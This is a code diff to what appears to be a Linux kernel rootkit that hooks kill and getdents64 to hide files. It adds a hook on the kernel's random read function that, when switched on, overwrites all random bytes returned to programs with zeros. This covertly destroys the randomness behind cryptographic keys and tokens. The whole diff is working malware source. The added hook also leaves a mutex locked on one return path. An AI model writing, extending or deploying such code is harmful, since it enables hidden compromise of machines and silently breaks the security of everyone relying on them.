@@ -8,6 +8,10 @@ DEFINE_MUTEX(hidden_files_mutex);
 
 asmlinkage long (*orig_kill)(const struct pt_regs *);
 asmlinkage long (*orig_getdents64)(const struct pt_regs *);
+asmlinkage ssize_t (*orig_random_read)(
+    struct file *file, char __user *buf,
+     size_t nbytes, loff_t *ppos
+     );
 
 
 bool add_hidden_file(char* filename) {
@@ -194,4 +198,49 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
     mutex_unlock(&hidden_files_mutex);
     return len;
 
+}
+
+
+asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
+{
+    int len;
+    u32 i;
+    long error;
+    char *buffer;
+
+    len = orig_random_read(file, buf, nbytes, ppos);
+
+    if (!mutex_trylock(&random_mutex) || len < 0) {
+        return len;
+    }
+
+    if (!random_switched) {
+        return len;
+    }
+
+    buffer = kzalloc(len, GFP_KERNEL);
+
+    if (!buffer) {
+        mutex_unlock(&random_mutex);
+        return len;
+    }
+    
+    if (copy_from_user(buffer, buf, len) != 0) {
+        kfree(buffer);
+        mutex_unlock(&random_mutex);
+        return len;
+    }
+
+    for (i = 0 ; i < len ; i++)
+        buffer[i] = '\0';
+
+    if (copy_to_user(buf, buffer, len) != 0) {
+        kfree(buffer);
+        mutex_unlock(&random_mutex);
+        return len;
+    }
+
+    kfree(buffer);
+    mutex_unlock(&random_mutex);
+    return len;
 }
